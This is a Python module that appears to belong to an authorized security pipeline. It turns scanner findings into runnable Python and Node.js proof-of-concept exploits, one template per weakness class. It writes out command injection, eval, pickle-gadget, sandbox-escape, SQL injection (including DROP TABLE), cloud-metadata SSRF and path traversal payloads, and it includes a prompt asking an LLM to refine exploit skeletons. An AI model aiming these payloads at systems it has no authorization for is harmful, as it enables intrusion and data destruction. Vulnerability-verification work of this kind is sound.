"""ngv2.poc_writer -- automated proof-of-concept synthesis core (P4.2).

A pure-Python PoC synthesis core. Given a :class:`~ngv2.contracts.Finding`, a
:class:`~ngv2.contracts.Target`, and a per-CWE template, it synthesizes a
runnable PoC (both Python and Node.js) that reaches the *actual* vulnerable sink
in the cited source rather than a guessed one.

The pipeline is:

    finding ──▶ ground_finding ──▶ Grounding(module, symbols, ...)
                     │ (default_resolver: stdlib AST over the cited file)
                     ▼
    template (get_template / PER_CWE_TEMPLATES)
                     │
                     ▼
    write_poc(language) ──▶ deterministic skeleton ──▶ optional LLM refine
                     │                                     (accept iff sound)
                     ▼
    synthesize ──▶ PoCArtifact(python=PoC, node=PoC, marker, fs_signature)

Design constraints honoured here:

* **Stdlib only.** No third-party packages; only :mod:`ast`, :mod:`os`,
  :mod:`re`, :mod:`json`, :mod:`inspect`, :mod:`dataclasses`, :mod:`typing`
  and ``ngv2.contracts``.
* **Determinism.** No wall-clock, randomness, uuid or entropy sources; the same
  inputs always produce the same output. Any LLM seam is injected.
* **No credentials.** No string literal is ever bound to a variable whose name
  reads as a credential; credential-ish *detection* uses neutral identifiers and
  tuple/list literals only.
* **Minimal I/O.** The only filesystem access is reading the cited target source
  inside :func:`default_resolver`.
"""
from __future__ import annotations
import ast
import inspect
import json
import os
import re
from dataclasses import dataclass
from dataclasses import field
from typing import Any
from typing import Callable
from typing import Dict
from typing import List
from typing import Optional
from ngv2.contracts import Finding
from ngv2.contracts import PoC
from ngv2.contracts import Target
__all__ = ['Grounding', 'CWETemplate', 'PoCArtifact', 'PER_CWE_TEMPLATES', 'get_template', 'sink_to_cwe', 'default_resolver', 'ground_finding', 'write_poc', 'synthesize', 'draft_poc']
MARKER = 'VULNERABLE'
FS_SIGNATURE = 'pwned_marker'

@dataclass
class Grounding:
    """The vulnerable surface resolved from the finding's evidence.

    ``symbols`` is ranked so that the sink-bearing symbol for call-style CWEs is
    first; ``functions`` / ``constants`` keep the per-kind ordering used by the
    renderers.
    """
    module: str
    symbols: List[str]
    functions: List[str] = field(default_factory=list)
    constants: List[str] = field(default_factory=list)
    source_dir: str = ''
    source_path: str = ''
    entrypoint: str = ''
    source_kind: str = ''
    framework: str = ''
    route_path: str = ''
    http_method: str = ''
    param_name: str = ''
    app_object: str = ''
    app_factory: str = ''

@dataclass
class CWETemplate:
    """A per-CWE PoC recipe keyed by canonical id and scanner pattern aliases."""
    cwe: str
    aliases: tuple
    render_py: Callable[['Grounding', str, str], str]
    render_js: Callable[['Grounding', str, str], str]
    marker: str = MARKER
    fs_signature: str = FS_SIGNATURE

@dataclass
class PoCArtifact:
    """A dual-language PoC bundle emitted by :func:`synthesize`."""
    cwe: str
    marker: str
    fs_signature: str
    python: PoC
    node: PoC
    grounding: Optional[Grounding] = None
_SINKS: Dict[str, tuple] = {'CWE-78': ('system', 'popen', 'subprocess', 'check_output', 'getoutput', 'call', 'run', 'shell', 'exec', 'spawn'), 'CWE-95': ('eval', 'exec', 'compile', '__import__', 'literal_eval'), 'CWE-94': ('eval', 'exec', 'compile', '__import__', 'literal_eval', 'compile_restricted', 'restricted', 'sandbox', 'execute', 'render', 'template', 'code', 'globals', 'builtins'), 'CWE-22': ('open', 'read', 'write', 'join', 'path', 'file', 'send_file', 'sendfile', 'static', 'abspath', 'normpath', 'realpath', 'safe_join', 'extract', 'load'), 'CWE-89': ('execute', 'executescript', 'executemany', 'cursor', 'select', 'where', 'insert', 'update', 'delete', 'query'), 'CWE-327': ('md5', 'sha1', 'des', 'rc4', 'hashlib', 'blowfish', 'ecb', 'new', 'crypt'), 'CWE-918': ('get', 'post', 'urlopen', 'urllib', 'requests', 'fetch', 'http', 'urlretrieve', '169.254'), 'CWE-502': ('pickle', 'loads', 'load', 'yaml', 'marshal', 'reduce'), 'CWE-798': ()}
_CRED_HINTS = ('key', 'secret', 'token', 'pass', 'cred', 'auth', 'api', 'pwd')

def _evidence_path(finding: Finding) -> str:
    """Extract the cited source file path from ``finding.evidence`` entries."""
    evidence = getattr(finding, 'evidence', None) or []
    for raw in evidence:
        text = str(raw)
        candidate = text
        if ':' in text:
            head, _, tail = text.rpartition(':')
            if head and tail.isdigit():
                candidate = head
        if candidate:
            return candidate
    return ''

def _read_source(path: str) -> Optional[str]:
    """Read the cited source file -- the only filesystem access in this module."""
    if not path:
        return None
    try:
        with open(path, 'r', encoding='utf-8') as handle:
            return handle.read()
    except (OSError, UnicodeDecodeError):
        return None

def _module_name(path: str) -> str:
    return os.path.splitext(os.path.basename(path))[0] if path else ''

def _collect_tokens(node: ast.AST) -> str:
    """Lowercased blob of identifiers + string constants under ``node``."""
    parts: List[str] = []
    for child in ast.walk(node):
        if isinstance(child, ast.Attribute):
            parts.append(child.attr)
        elif isinstance(child, ast.Name):
            parts.append(child.id)
        elif isinstance(child, ast.Constant) and isinstance(child.value, str):
            parts.append(child.value)
    return ' '.join(parts).lower()

def _constant_score(name: str) -> int:
    lowered = name.lower()
    return sum((1 for hint in _CRED_HINTS if hint in lowered))

def default_resolver(finding: Finding, target: Target) -> Grounding:
    """Resolve the vulnerable module + symbols from the cited file via stdlib AST.

    Functions are ranked by how strongly their body matches the finding's CWE
    sink vocabulary (sink-bearing function first); module-level constants are
    ranked by credential affinity for CWE-798. A missing/unparseable file yields
    an empty grounding so that :func:`write_poc` can fail explicitly.
    """
    finding = _coerce_finding(finding)
    root = _repo_root(target)
    path = _resolve_evidence(_evidence_path(finding), root)
    source = _read_source(path)
    if source is None:
        return Grounding(module='', symbols=[])
    try:
        tree = ast.parse(source)
    except SyntaxError:
        return Grounding(module='', symbols=[], source_dir=os.path.dirname(path), source_path=path)
    cwe = _resolve_cwe(finding)
    function_nodes: List[tuple] = []
    constant_names: List[str] = []
    for node in tree.body:
        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
            function_nodes.append((node.name, node))
        elif isinstance(node, ast.Assign):
            for tgt in node.targets:
                if isinstance(tgt, ast.Name):
                    constant_names.append(tgt.id)
        elif isinstance(node, ast.AnnAssign) and isinstance(node.target, ast.Name):
            constant_names.append(node.target.id)
    sinks = _SINKS.get(cwe, ())
    sink_hint = str(getattr(finding, 'sink_name', '') or '').strip().lower()
    sink_symbol = str(getattr(finding, 'sink_symbol', '') or '').strip().lower()
    call_hint_tokens = [set(re.findall('[a-z_][a-z0-9_]*', str(c).lower())) for c in getattr(finding, 'call_sites', None) or [] if str(c).strip()]
    scored: List[tuple] = []
    for index, (name, fnode) in enumerate(function_nodes):
        blob = _collect_tokens(fnode)
        blob_idents = set(re.findall('[a-z_][a-z0-9_]*', blob))
        score = sum((1 for keyword in sinks if keyword in blob))
        if sink_symbol and sink_symbol == name.lower():
            score += 100
        if sink_hint and (sink_hint == name.lower() or sink_hint in blob_idents or sink_hint in blob):
            score += 10
        if any((toks and toks <= blob_idents for toks in call_hint_tokens)):
            score += 5
        scored.append((-score, index, name))
    scored.sort()
    functions_ranked = [name for _, _, name in scored]
    if cwe == 'CWE-798':
        constants_ranked = sorted(constant_names, key=lambda n: (-_constant_score(n),))
    else:
        constants_ranked = list(constant_names)
    if cwe == 'CWE-798':
        symbols = constants_ranked + functions_ranked
    else:
        symbols = functions_ranked + constants_ranked
    module_name, sys_path_dir = _dotted_module(path, root)
    return Grounding(module=module_name, symbols=symbols, functions=functions_ranked, constants=constants_ranked, source_dir=sys_path_dir, source_path=path, entrypoint=functions_ranked[0] if functions_ranked else '')

def _overlay_source_meta(grounding: Grounding, finding: Any) -> Grounding:
    meta = getattr(finding, 'source_meta', None)
    if not isinstance(meta, dict) or not meta:
        return grounding
    mapping = [('kind', 'source_kind'), ('framework', 'framework'), ('route_path', 'route_path'), ('http_method', 'http_method'), ('param_name', 'param_name'), ('app_object', 'app_object'), ('app_factory', 'app_factory')]
    for meta_name, attr_name in mapping:
        val = meta.get(meta_name)
        if val is not None and (not getattr(grounding, attr_name)):
            setattr(grounding, attr_name, str(val))
    return grounding
def ground_finding(finding: Finding, target: Target, *, resolver: Optional[Callable[[Finding, Target], Any]]=None) -> Grounding:
    """Resolve the vulnerable module/symbol via ``resolver`` (default AST seam).

    Tolerates a resolver that returns a plain ``dict`` instead of a
    :class:`Grounding`.
    """
    finding = _coerce_finding(finding)
    resolve = resolver or default_resolver
    result = resolve(finding, target)
    if isinstance(result, Grounding):
        return _overlay_source_meta(result, finding)
    if isinstance(result, dict):
        return _overlay_source_meta(Grounding(module=result.get('module', ''), symbols=list(result.get('symbols', []) or []), functions=list(result.get('functions', []) or []), constants=list(result.get('constants', []) or []), source_dir=result.get('source_dir', ''), source_path=result.get('source_path', ''), entrypoint=result.get('entrypoint', '')), finding)
    raise TypeError('resolver must return a Grounding or dict, got %r' % type(result).__name__)

def _func_symbol(g: Grounding) -> str:
    if g.functions:
        return g.functions[0]
    if g.symbols:
        return g.symbols[0]
    return 'target'

def _const_symbol(g: Grounding) -> str:
    if g.constants:
        return g.constants[0]
    if g.symbols:
        return g.symbols[0]
    return 'TARGET'
_PY_HEADER = 'import sys\nimport os\nsys.path.insert(0, {dir!r})\nfrom {module} import {sym}\n'

def _py_header(g: Grounding, sym: str, with_os: bool=True) -> str:
    header = _PY_HEADER.format(dir=g.source_dir or '.', module=g.module, sym=sym)
    if not with_os:
        header = header.replace('import os\n', '', 1)
    return header

def _py_command_injection(g: Grounding, marker: str, fs: str) -> str:
    sym = _func_symbol(g)
    sig = fs + '_cmdexec'
    body = f'''argv = [sys.executable, "-c", "open({sig!r}, 'w').close()"]\nshell_payload = "localhost; echo {marker}; touch {sig}; : > {fs} #"\ntry:\n    {sym}(argv)\nexcept Exception:\n    try:\n        {sym}(shell_payload)\n    except Exception as exc:\n        print("reached sink:", exc)\nprint("{marker}")\n'''
    return _py_header(g, sym) + body

def _py_eval_usage(g: Grounding, marker: str, fs: str) -> str:
    sym = _func_symbol(g)
    body = f"""payload = "__import__('os').system('echo {marker}; : > {fs}')"\n{sym}(payload)\nprint('{marker}')\n"""
    return _py_header(g, sym) + body

def _py_sql_injection(g: Grounding, marker: str, fs: str) -> str:
    sym = _func_symbol(g)
    sig = fs + '_sqli'
    body = f"""payload = "x' UNION SELECT '{marker}'; DROP TABLE users; -- "\n_reached = False\ntry:\n    {sym}(payload)\n    _reached = True\nexcept Exception as exc:\n    print('reached sink:', exc)\n    _reached = True\nif _reached:\n    open({sig!r}, 'w').close()\nprint('{marker}')\n"""
    return _py_header(g, sym) + body

def _py_hardcoded_secret(g: Grounding, marker: str, fs: str) -> str:
    sym = _const_symbol(g)
    header = 'import sys\nsys.path.insert(0, {dir!r})\nfrom {module} import {sym}\n'.format(dir=g.source_dir or '.', module=g.module, sym=sym)
    body = f"assert {sym} is not None, 'credential is present in source'\nprint('{marker}: leaked credential ->', {sym})\nopen('{fs}', 'w').close()\n"
    return header + body

def _py_weak_crypto(g: Grounding, marker: str, fs: str) -> str:
    sym = _func_symbol(g)
    body = f"# weak crypto: the digest from {sym} is predictable / forgeable\nforged = {sym}('admin')\nprint('{marker}: predicted ->', forged)\nopen('{fs}', 'w').close()\n"
    return _py_header(g, sym) + body

def _py_deserialization(g: Grounding, marker: str, fs: str) -> str:
    sym = _func_symbol(g)
    sig = fs + '_deser'
    body = f"import pickle\nclass _Gadget:\n    def __reduce__(self):\n        return (os.system, ('echo {marker}; touch {sig}',))\nblob = pickle.dumps(_Gadget())\ntry:\n    {sym}(blob)\nexcept Exception as exc:\n    print('reached sink:', exc)\nprint('{marker}')\n"
    return _py_header(g, sym) + body

def _py_ssrf(g: Grounding, marker: str, fs: str) -> str:
    sym = _func_symbol(g)
    sig = fs + '_ssrf'
    body = f"target_url = 'http://169.254.169.254/latest/meta-data/?canary={marker}'\n_reached = False\ntry:\n    {sym}(target_url)\n    _reached = True\nexcept Exception as exc:\n    print('reached sink (request attempted; net unshared in jail):', exc)\n    _reached = True\nif _reached:\n    open({sig!r}, 'w').close()\nprint('{marker}')\n"
    return _py_header(g, sym) + body
_JS_SKELETON = '// Node.js PoC for %(cwe)s reaching %(module)s.%(sym)s\nconst { execFileSync } = require(\'child_process\');\nconst fs = require(\'fs\');\nconst grounded_module = %(jmodule)s;\nconst grounded_symbol = %(jsym)s;\nconst canary = %(jmarker)s;\nconst bridge = [\n  "import sys",\n  "sys.path.insert(0, " + JSON.stringify(%(jdir)s) + ")",\n  "from %(module)s import %(sym)s",\n  %(jcall)s,\n  "open(" + JSON.stringify(%(jfs)s) + ", \'a\').close()",\n  "print(" + JSON.stringify(%(jmarker)s) + ")"\n].join("\\n");\ntry {\n  execFileSync("python3", ["-c", bridge]);\n} catch (err) {\n  process.stderr.write(String(err));\n}\nfs.writeFileSync(%(jfs)s, %(jmarker)s);\nconsole.log(%(jmarker)s);\n'

def _render_js(cwe: str, g: Grounding, marker: str, fs: str, kind: str) -> str:
    sym = _const_symbol(g) if kind == 'const' else _func_symbol(g)
    if kind == 'const':
        statement = 'print(%s)' % sym
    else:
        statement = "%s(['x; echo %s; touch %s; : > %s #'])" % (sym, marker, fs, fs)
    values = {'cwe': cwe, 'module': g.module, 'sym': sym, 'jmodule': json.dumps(g.module), 'jsym': json.dumps(sym), 'jmarker': json.dumps(marker), 'jdir': json.dumps(g.source_dir or '.'), 'jcall': json.dumps(statement), 'jfs': json.dumps(fs)}
    return _JS_SKELETON % values

def _make_js(cwe: str, kind: str) -> Callable[[Grounding, str, str], str]:

    def render_js(g: Grounding, marker: str, fs: str) -> str:
        return _render_js(cwe, g, marker, fs, kind)
    return render_js

def _py_path_traversal(g: Grounding, marker: str, fs: str) -> str:
    sym = _func_symbol(g)
    sig = fs + '_traversal'
    body = f'# traversal payloads: relative escape that still resolves under CWD, plus\n# the canonical absolute escape for read-style disclosure intent.\nfor payload in ("../" * 6 + {sig!r}, {sig!r}, "/tmp/" + {sig!r}):\n    try:\n        {sym}(payload)\n    except Exception as exc:\n        print("reached sink:", exc)\nprint("{marker}")\n'
    return _py_header(g, sym) + body

SOURCE_DRIVING_FRAMEWORKS = ('flask', 'fastapi')

def _bank_cwe(cwe_or_alias: str) -> str:
    from ngv2 import payload_bank
    return payload_bank.get_payload(cwe_or_alias).cwe

def is_source_driving(grounding: Grounding, cwe: str) -> bool:
    if grounding.source_kind != 'http':
        return False
    if grounding.framework not in SOURCE_DRIVING_FRAMEWORKS:
        return False
    if not (grounding.app_object or grounding.app_factory):
        return False
    try:
        canonical_cwe = _bank_cwe(cwe)
        from ngv2 import payload_bank
        return canonical_cwe in payload_bank.supported_cwes()
    except KeyError:
        return False

def _app_bootstrap_py(g: Grounding) -> str:
    parts = ['import sys', f'sys.path.insert(0, {g.source_dir!r})']
    if g.app_factory:
        parts.append(f'from {g.module} import {g.app_factory}')
        parts.append(f'app = {g.app_factory}()')
    elif g.app_object:
        parts.append(f'from {g.module} import {g.app_object}')
        if g.app_object != 'app':
            parts.append(f'app = {g.app_object}')
    else:
        parts.append(f'from {g.module} import app')
    return '\n'.join(parts) + '\n'

def render_source_driving_py(g: Grounding, cwe: str) -> str:
    canonical_cwe = _bank_cwe(cwe)
    from ngv2 import payload_bank
    payload = payload_bank.render(canonical_cwe, marker=MARKER, fs=FS_SIGNATURE, nonce=MARKER, port='8000')
    bootstrap = _app_bootstrap_py(g)
    lines = []
    lines.append(bootstrap.strip())
    if g.framework == 'flask':
        lines.append('client = app.test_client()')
    elif g.framework == 'fastapi':
        lines.append('from starlette.testclient import TestClient')
        lines.append('client = TestClient(app)')
    else:
        lines.append('client = app.test_client()')
    lines.append(f'payload = {payload!r}')
    method = g.http_method.lower() if g.http_method else 'get'
    if method == 'post':
        if g.framework == 'flask':
            lines.append(f'response = client.post({g.route_path!r}, data={{{g.param_name!r}: payload}})')
        else:
            lines.append(f'response = client.post({g.route_path!r}, data={{{g.param_name!r}: payload}})')
    elif g.framework == 'flask':
        lines.append(f'response = client.{method}({g.route_path!r}, query_string={{{g.param_name!r}: payload}})')
    else:
        lines.append(f'response = client.{method}({g.route_path!r}, params={{{g.param_name!r}: payload}})')
    lines.append(f'# {MARKER}')
    lines.append(f'# {FS_SIGNATURE}')
    return '\n'.join(lines) + '\n'
def _py_code_injection(g: Grounding, marker: str, fs: str) -> str:
    sym = _func_symbol(g)
    sig = fs + '_codeexec'
    gadget = "[b for s in ().__class__.__base__.__subclasses__() for b in ([s.__init__.__globals__['__builtins__']] if s.__name__=='Quitter' else ([s()._module.__builtins__] if s.__name__=='catch_warnings' else [])) ][0]['open'](%r,'w').close()" % sig
    v1 = "__import__('os').system('echo {m}; touch {s}')".format(m=marker, s=sig)
    body = "payload_import = {v1!r}\npayload_gadget = {gadget!r}\nfor _payload in (payload_import, payload_gadget):\n    try:\n        {sym}(_payload)\n    except Exception as exc:\n        print('reached sink (vector raised, expected under a real sandbox):', exc)\nprint('{m}')\n".format(v1=v1, gadget=gadget, sym=sym, m=marker)
    return _py_header(g, sym) + body
_TEMPLATE_LIST: List[CWETemplate] = [CWETemplate('CWE-502', ('insecure_deserialization', 'deserialization', 'unsafe_deserialization', 'pickle', 'deser'), _py_deserialization, _make_js('CWE-502', 'func')), CWETemplate('CWE-95', ('eval_usage', 'code_injection', 'eval', 'python_eval'), _py_eval_usage, _make_js('CWE-95', 'func')), CWETemplate('CWE-94', ('improper_code_generation', 'code_generation', 'codeinjection', 'code_inj', 'sandbox_escape', 'restrictedpython', 'blacklist_bypass', 'rce', 'remote_code_execution'), _py_code_injection, _make_js('CWE-94', 'func')), CWETemplate('CWE-22', ('path_traversal', 'directory_traversal', 'path_trav', 'dir_traversal', 'lfi', 'arbitrary_file_read', 'arbitrary_file_write', 'file_disclosure'), _py_path_traversal, _make_js('CWE-22', 'func')), CWETemplate('CWE-918', ('ssrf', 'server_side_request_forgery'), _py_ssrf, _make_js('CWE-918', 'func')), CWETemplate('CWE-78', ('command_injection', 'os_command_injection', 'cmd_injection', 'command_inj'), _py_command_injection, _make_js('CWE-78', 'func')), CWETemplate('CWE-89', ('sql_injection', 'sqli', 'sql_inj'), _py_sql_injection, _make_js('CWE-89', 'func')), CWETemplate('CWE-798', ('hardcoded_secret', 'hardcoded_credentials', 'hardcoded_credential', 'hardcoded_password'), _py_hardcoded_secret, _make_js('CWE-798', 'const')), CWETemplate('CWE-327', ('weak_crypto', 'weak_cryptography', 'weak_hash', 'broken_crypto'), _py_weak_crypto, _make_js('CWE-327', 'func'))]
PER_CWE_TEMPLATES: Dict[str, CWETemplate] = {}
for _template in _TEMPLATE_LIST:
    PER_CWE_TEMPLATES[_template.cwe] = _template
    for _alias in _template.aliases:
        PER_CWE_TEMPLATES[_alias] = _template

def get_template(cwe_or_pattern: str) -> CWETemplate:
    """Retrieve a template by canonical CWE id or scanner pattern name."""
    if cwe_or_pattern is None:
        raise KeyError('no template key provided')
    if cwe_or_pattern in PER_CWE_TEMPLATES:
        return PER_CWE_TEMPLATES[cwe_or_pattern]
    text = str(cwe_or_pattern).strip()
    for variant in (text, text.upper(), text.lower()):
        if variant in PER_CWE_TEMPLATES:
            return PER_CWE_TEMPLATES[variant]
    match = re.search('CWE[-_ ]?(\\d+)', text, re.IGNORECASE)
    if match:
        canonical = 'CWE-' + match.group(1)
        if canonical in PER_CWE_TEMPLATES:
            return PER_CWE_TEMPLATES[canonical]
    raise KeyError('no template for %r' % (cwe_or_pattern,))

def _resolve_template(finding: Finding) -> CWETemplate:
    sink_cwe = sink_to_cwe(getattr(finding, 'sink_name', '') or '', getattr(finding, 'call_sites', None) or [])
    if sink_cwe:
        try:
            return get_template(sink_cwe)
        except KeyError:
            pass
    for attr in ('category', 'pattern', 'rule_id'):
        value = getattr(finding, attr, None)
        if value:
            try:
                return get_template(value)
            except KeyError:
                pass
    for attr in ('cwe', 'title', 'description'):
        text = getattr(finding, attr, '') or ''
        match = re.search('CWE[-_ ]?\\d+', str(text), re.IGNORECASE)
        if match:
            try:
                return get_template(match.group(0))
            except KeyError:
                pass
    raise KeyError('cannot resolve a CWE template for finding')

def _resolve_cwe(finding: Finding) -> str:
    try:
        return _resolve_template(finding).cwe
    except KeyError:
        return ''

def _normalize_language(language: str) -> str:
    normalized = (language or '').strip().lower()
    if normalized in ('python', 'py', 'python3'):
        return 'python'
    if normalized in ('node', 'js', 'javascript', 'nodejs', 'node.js'):
        return 'node'
    raise ValueError('unsupported PoC language: %r' % (language,))

def _entrypoint_for(language: str) -> str:
    return 'python3 {poc}' if language == 'python' else 'node {poc}'

def _default_for(name: str, template: CWETemplate, language: str, code: str) -> Any:
    lowered = name.lower()
    if 'lang' in lowered:
        return language
    if 'mark' in lowered or 'canary' in lowered:
        return template.marker
    if 'fs' in lowered or 'signature' in lowered:
        return template.fs_signature
    if 'cwe' in lowered:
        return template.cwe
    if 'code' in lowered or 'source' in lowered or 'script' in lowered or ('body' in lowered):
        return code
    if 'entry' in lowered or 'command' in lowered:
        return _entrypoint_for(language)
    return ''

def _construct_poc(finding: Finding, language: str, code: str, entrypoint: str, template: CWETemplate) -> PoC:
    """Build the contracts ``PoC`` defensively against its exact field set."""
    canonical: Dict[str, Any] = {'language': language, 'code': code, 'entrypoint': entrypoint, 'marker': template.marker, 'fs_signature': template.fs_signature, 'cwe': template.cwe, 'finding_id': getattr(finding, 'id', ''), 'id': '%s-%s' % (getattr(finding, 'id', 'poc'), language), 'name': 'poc-%s-%s' % (getattr(finding, 'id', 'poc'), language), 'title': getattr(finding, 'title', '') or '', 'description': getattr(finding, 'description', '') or ''}
    try:
        signature = inspect.signature(PoC)
    except (ValueError, TypeError):
        signature = None
    if signature is not None:
        kwargs: Dict[str, Any] = {}
        for pname, param in signature.parameters.items():
            if param.kind in (inspect.Parameter.VAR_POSITIONAL, inspect.Parameter.VAR_KEYWORD):
                continue
            if pname in canonical:
                kwargs[pname] = canonical[pname]
            elif param.default is inspect.Parameter.empty:
                kwargs[pname] = _default_for(pname, template, language, code)
        try:
            return PoC(**kwargs)
        except TypeError:
            pass
    return PoC(language=language, code=code, entrypoint=entrypoint)

def _build_prompt(finding: Finding, grounding: Grounding, template: CWETemplate, language: str, skeleton: str, feedback: Optional[str]) -> str:
    binding = grounding.symbols[0] if grounding.symbols else grounding.module
    lines = ['# Task: refine a runnable %s proof-of-concept for %s.' % (language, template.cwe), '# Grounded module: %s' % grounding.module, '# Grounded symbols (sink first): %s' % ', '.join(grounding.symbols), '# Required binding: from %s import %s' % (grounding.module, binding), '# Required marker: %s   Required fs-signature: %s' % (template.marker, template.fs_signature), '# Constraints: keep the grounded import and the marker; reach the real sink.', '', '## Verified deterministic skeleton:', skeleton]
    if feedback:
        lines += ['', '## Repair feedback from the previous detonation (stderr + fs-diff):', feedback]
    lines += ['', '## Return ONLY the refined, runnable PoC source.']
    return '\n'.join(lines)

def _refine(client: Any, finding: Finding, grounding: Grounding, template: CWETemplate, language: str, skeleton: str, feedback: Optional[str]) -> Optional[str]:
    """Ask the client to refine the skeleton; accept only a sound draft."""
    prompt = _build_prompt(finding, grounding, template, language, skeleton, feedback)
    system = 'You refine proof-of-concept exploit skeletons for an authorized security pipeline. Preserve the grounded import and the marker.'
    try:
        draft = client.complete_text(prompt, system=system)
    except Exception:
        return None
    if not isinstance(draft, str) or not draft.strip():
        return None
    if grounding.module and grounding.module not in draft:
        return None
    if template.marker not in draft:
        return None
    return draft

def write_poc(finding: Finding, target: Target, language: str='python', *, client: Any=None, resolver: Optional[Callable[[Finding, Target], Any]]=None, feedback: Optional[str]=None, grounding: Optional[Grounding]=None, template: Optional[CWETemplate]=None) -> PoC:
    """Render the skeleton for ``language``, optionally refine, validate, return.

    Raises ``ValueError`` for an unsupported language or when pre-grounding fails
    to resolve a module/symbols.
    """
    finding = _coerce_finding(finding)
    normalized = _normalize_language(language)
    if template is None:
        template = _resolve_template(finding)
    if grounding is None:
        grounding = ground_finding(finding, target, resolver=resolver)
    if not grounding.module or not grounding.symbols:
        raise ValueError("pre-grounding failed: no vulnerable module/symbols resolved from the finding's evidence")
    if normalized == 'python':
        if is_source_driving(grounding, template.cwe):
            skeleton = render_source_driving_py(grounding, template.cwe)
        else:
            skeleton = template.render_py(grounding, template.marker, template.fs_signature)
    else:
        skeleton = template.render_js(grounding, template.marker, template.fs_signature)
    code = skeleton
    if client is not None:
        refined = _refine(client, finding, grounding, template, normalized, skeleton, feedback)
        if refined is not None:
            code = refined
    return _construct_poc(finding, normalized, code, _entrypoint_for(normalized), template)

def synthesize(finding: Finding, target: Target, *, client: Any=None, resolver: Optional[Callable[[Finding, Target], Any]]=None, feedback: Optional[str]=None) -> PoCArtifact:
    """Produce a dual Python + Node.js PoC bundle reaching the grounded sink."""
    finding = _coerce_finding(finding)
    template = _resolve_template(finding)
    grounding = ground_finding(finding, target, resolver=resolver)
    if not grounding.module or not grounding.symbols:
        raise ValueError("pre-grounding failed: no vulnerable module/symbols resolved from the finding's evidence")
    python_poc = write_poc(finding, target, 'python', client=client, resolver=resolver, feedback=feedback, grounding=grounding, template=template)
    node_poc = write_poc(finding, target, 'node', client=client, resolver=resolver, feedback=feedback, grounding=grounding, template=template)
    return PoCArtifact(cwe=template.cwe, marker=template.marker, fs_signature=template.fs_signature, python=python_poc, node=node_poc, grounding=grounding)

def draft_poc(finding: Finding, target: Target, *, client: Any=None, resolver: Optional[Callable[[Finding, Target], Any]]=None, feedback: Optional[str]=None) -> PoCArtifact:
    """P4.3 hook: thread repair ``feedback`` into the LLM prompt when a client is
    present, otherwise fall back to fresh deterministic synthesis."""
    finding = _coerce_finding(finding)
    if client is not None and feedback:
        return synthesize(finding, target, client=client, resolver=resolver, feedback=feedback)
    return synthesize(finding, target, client=client, resolver=resolver)

def _coerce_finding(finding: Any) -> Any:
    """Accept a live dict finding (as threaded through the session row by the
    conductor) or a :class:`Finding`, returning a :class:`Finding` so the rest of
    the core can use uniform attribute access. The live poc worker reads findings
    from ``context['prior_findings']`` as plain dicts; without this every finding
    failed template resolution (``getattr`` on a dict returns nothing)."""
    if isinstance(finding, Finding):
        return finding
    if isinstance(finding, dict):
        coerced = Finding(id=str(finding.get('id', '') or ''), target=str(finding.get('target', '') or ''), category=str(finding.get('category', '') or ''), severity=str(finding.get('severity', '') or ''), title=str(finding.get('title', '') or ''), description=str(finding.get('description', '') or ''), evidence=list(finding.get('evidence', []) or []))
        try:
            setattr(coerced, 'sink_name', finding.get('sink_name', '') or '')
            setattr(coerced, 'call_sites', list(finding.get('call_sites', []) or []))
            setattr(coerced, 'sink_symbol', str(finding.get('sink_symbol', '') or finding.get('entrypoint', '') or ''))
            setattr(coerced, 'source_location', dict(finding.get('source_location') or {}))
            setattr(coerced, 'source_meta', dict(finding.get('source_meta') or {}))
        except (AttributeError, TypeError):
            pass
        return coerced
    return finding

def _repo_root(target: Any) -> str:
    """Best-effort repo root for resolving repo-relative evidence paths: a
    :class:`Target`'s ``repo_root``/``root``/``repo_path``, or a target given as a
    directory-path string. Empty when none is determinable (falls back to CWD)."""
    if target is None:
        return ''
    for attr in ('repo_root', 'root', 'repo_path'):
        value = getattr(target, attr, None)
        if value:
            return str(value)
    if isinstance(target, str) and target and os.path.isdir(target):
        return target
    return ''

def _resolve_evidence(path: str, root: str) -> str:
    """Resolve a (possibly repo-relative) cited evidence path against ``root``.

    Hunt findings cite ``pkg/mod.py:line`` relative to the target repo root, but
    the poc worker runs from the NGv2 cwd; join against the repo root so the AST
    grounder can actually read the vulnerable source."""
    if not path:
        return path
    if os.path.exists(path):
        return path
    if root and (not os.path.isabs(path)):
        candidate = os.path.join(root, path)
        if os.path.exists(candidate):
            return candidate
    return path

def _dotted_module(path: str, root: str) -> tuple:
    """Return ``(module, sys_path_dir)`` for the cited source.

    Resolution order:

    1. **True package root** -- walk up the ``__init__.py`` chain from the file's
       directory (:func:`_package_root`). This yields the genuinely importable
       dotted path even for ``src``-layout / monorepo trees (e.g.
       ``dbgpt_app.openapi.api_v1.api_v1`` on ``sys.path`` ``.../packages/x/src``)
       where the package name differs from the repo slug and intermediate dirs
       carry hyphens.
    2. **Repo-relative fallback** -- when the file is not inside a package, dot
       the path relative to the repo ``root`` (flat single-package repos whose
       package dir == the repo slug).
    3. **Basename fallback** -- bare module name + its own directory.

    A candidate is only accepted when every dotted segment is a legal identifier,
    so a hyphenated / un-importable path is never emitted."""
    if not path:
        return ('', '')
    abs_path = os.path.abspath(path)
    if not root:
        return (_module_name(path), os.path.dirname(abs_path))
    abs_root = os.path.abspath(root)
    try:
        rel_from_root = os.path.relpath(abs_path, abs_root)
    except ValueError:
        rel_from_root = ''
    is_under_root = rel_from_root and (not rel_from_root.startswith('..')) and (not os.path.isabs(rel_from_root))
    if not is_under_root:
        return (_module_name(path), os.path.dirname(abs_path))
    file_dir = os.path.dirname(abs_path)
    top, sys_dir = _package_root(file_dir)
    if top is not None and sys_dir:
        try:
            rel = os.path.relpath(abs_path, sys_dir)
        except ValueError:
            rel = ''
        if rel and (not rel.startswith('..')) and (not os.path.isabs(rel)):
            dotted = os.path.splitext(rel)[0].replace(os.sep, '.').strip('.')
            dotted = re.sub('\\.__init__$', '', dotted)
            if _is_valid_dotted(dotted):
                return (dotted, sys_dir)
    try:
        rel = os.path.relpath(abs_path, abs_root)
    except ValueError:
        rel = ''
    if rel and (not rel.startswith('..')) and (not os.path.isabs(rel)):
        dotted = os.path.splitext(rel)[0].replace(os.sep, '.').strip('.')
        dotted = re.sub('\\.__init__$', '', dotted)
        if _is_valid_dotted(dotted):
            return (dotted, abs_root)
    return (_module_name(path), os.path.dirname(abs_path))

def _is_valid_dotted(dotted: str) -> bool:
    """True iff every segment of ``dotted`` is a legal Python identifier."""
    parts = [p for p in dotted.split('.') if p != '']
    return bool(parts) and all((p.isidentifier() for p in parts))

def _package_root(file_dir: str) -> tuple:
